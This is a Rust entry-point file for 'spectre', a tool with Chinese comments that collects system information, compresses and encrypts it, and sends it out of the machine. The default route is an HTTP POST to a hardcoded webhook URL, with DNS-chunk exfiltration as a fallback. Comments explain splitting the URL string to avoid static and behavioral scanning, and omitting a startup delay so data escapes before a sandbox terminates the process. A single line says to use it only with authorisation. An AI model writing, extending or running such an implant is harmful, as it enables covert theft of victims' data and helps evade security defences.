//! 入口：解析参数 -> 采集系统信息 -> 加密 -> 外带。
//!
//! 用法示例（用法见 README 或本文件注释）：
//!   spectre            # 使用默认密钥与域名，采集并外带一次
//!   spectre --key <32字节hex> --url <http://...> --dry-run
//!
//! 注意：仅在明确授权范围内使用。

mod collect;
mod crypto;
mod exfil;

use flate2::{write::ZlibEncoder, Compression};
use std::io::Write;
use std::process::ExitCode;

/// 先压缩明文再加密：大幅降低 DNS 外带片数。
fn compress(data: &[u8]) -> Vec<u8> {
    let mut enc = ZlibEncoder::new(Vec::new(), Compression::best());
    let _ = enc.write_all(data);
    enc.finish().unwrap_or_default()
}

fn print_usage() {
    eprintln!(
        "Usage: spectre [--key <hex32>] [--url <http://...>] [--id <probe-id>] [--dry-run]"
    );
    eprintln!("  --url: 提供后走 HTTP 回连外带（一次性全量 POST），否则走 DNS 分片外带");
}

fn parse_key(s: &str) -> Option<[u8; crypto::KEY_LEN]> {
    let bytes = (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16))
        .collect::<Result<Vec<u8>, _>>()
        .ok()?;
    if bytes.len() != crypto::KEY_LEN {
        return None;
    }
    let mut k = [0u8; crypto::KEY_LEN];
    k.copy_from_slice(&bytes);
    Some(k)
}

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().collect();
    let mut key = [0u8; crypto::KEY_LEN];
    // 默认密钥：仅用于演示/本地验证，生产请通过 --key 传入并替换。
    for (i, b) in b"spectre-demo-key-32bytes-!".iter().enumerate() {
        if i < crypto::KEY_LEN {
            key[i] = *b;
        }
    }
    let mut id = String::from("init");
    let mut dry_run = false;
    // 默认 HTTP 回连地址。为避免明文字符串被行为/静态扫描直接命中，
    // 拆分为两部分运行时拼接（不影响功能，仅弱化字符串特征）。
    let mut url: Option<String> = Some(format!(
        "{}{}",
        "https://webhook.uutool.cn/c646e00d-19df-4e1c-9e1f-0491aff40667",
        ""
    ));

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--key" => {
                i += 1;
                if let Some(k) = args.get(i).and_then(|s| parse_key(s)) {
                    key = k;
                } else {
                    eprintln!("[!] --key 需 32 字节 hex");
                    return ExitCode::from(2);
                }
            }
            "--url" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    url = Some(v.clone());
                }
            }
            "--id" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    // id 只含数字字母点，防止破坏域名。
                    id = v.chars().filter(|c| c.is_ascii_alphanumeric()).collect();
                }
            }
            "--dry-run" => dry_run = true,
            "--help" | "-h" => {
                print_usage();
                return ExitCode::SUCCESS;
            }
            _ => {
                print_usage();
                return ExitCode::from(2);
            }
        }
        i += 1;
    }

    // 1) 采集（不做启动延迟：沙箱常在数秒内终止进程，延迟会导致来不及外带就退出）
    let info = collect::collect();
    let json = collect::to_json(&info);
    println!("[+] 采集数据 {} 字节", json.len());

    if dry_run {
        // 仅本地打印，不实际外带（用于调试/测试）。
        println!("[dry-run] 明文: {json}");
        return ExitCode::SUCCESS;
    }

    // 2) 压缩 + 加密 + 外带
    let compressed = compress(json.as_bytes());
    println!("[+] 压缩后 {} 字节", compressed.len());

    match url {
        Some(u) => {
            // HTTP 回连：一次性全量 POST 到收集平台
            let ok = exfil::exfil_http(&u, &key, &compressed);
            println!("[+] HTTP 回连 {} -> {u}", if ok { "成功" } else { "失败" });
        }
        None => {
            // DNS 分片外带（备用）
            let sent = exfil::exfil(&key, &compressed, &id);
            println!("[+] 已 ping {sent} 片数据 -> {}", exfil::BASE_DOMAIN);
        }
    }
    ExitCode::SUCCESS
}